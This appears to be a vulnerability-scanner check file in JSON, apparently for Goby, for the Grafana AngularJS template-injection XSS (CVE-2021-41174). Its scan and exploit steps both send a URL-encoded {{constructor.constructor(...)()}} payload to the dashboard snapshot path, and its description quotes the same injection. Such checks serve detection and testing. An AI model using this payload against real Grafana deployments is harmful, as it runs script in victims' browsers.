{
      "Name": "Grafana Angularjs Rendering XSS CVE-2021-41174",
      "Level": "1",
      "Tags": [
            "xss"
      ],
      "GobyQuery": "app=\"grafana_labs-company products\" || product=\"Grafana_Labs-Company Products\" || company=\"Grafana Labs \" || title=\"grafana\"",
      "Description": "Grafana is an open-source platform for monitoring and observability.",
      "Product": "Grafana",
      "Homepage": "https://grafana.com/",
      "Author": "",
      "Impact": "Grafana is an open-source platform for monitoring and observability. In affected versions if an attacker is able to convince a victim to visit a URL referencing a vulnerable page, arbitrary JavaScript content may be executed within the context of the victim's browser. The user visiting the malicious link must be unauthenticated and the link must be for a page that contains the login button in the menu bar. The url has to be crafted to exploit AngularJS rendering and contain the interpolation binding for AngularJS expressions. AngularJS uses double curly braces for interpolation binding: {{ }} ex: {{constructor.constructor(‘alert(1)’)()}}. When the user follows the link and the page renders, the login button will contain the original link with a query parameter to force a redirect to the login page. The URL is not validated and the AngularJS rendering engine will execute the JavaScript expression contained in the URL. Users are advised to upgrade as soon as possible. If for some reason you cannot upgrade, you can use a reverse proxy or similar to block access to block the literal string {{ in the path.",
      "Recommendation": "",
      "References": [
            "https://nvd.nist.gov/vuln/detail/CVE-2021-41174",
            "https://github.com/grafana/grafana/security/advisories/GHSA-3j9m-hcv9-rpj8"
      ],
      "HasExp": true,
      "ExpParams": null,
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "frontend_boot_js_done_time_seconds",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "frontend_boot_js_done_time_seconds",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "PostTime": "0000-00-00 00:00:00",
      "GobyVersion": "0.0.0"
}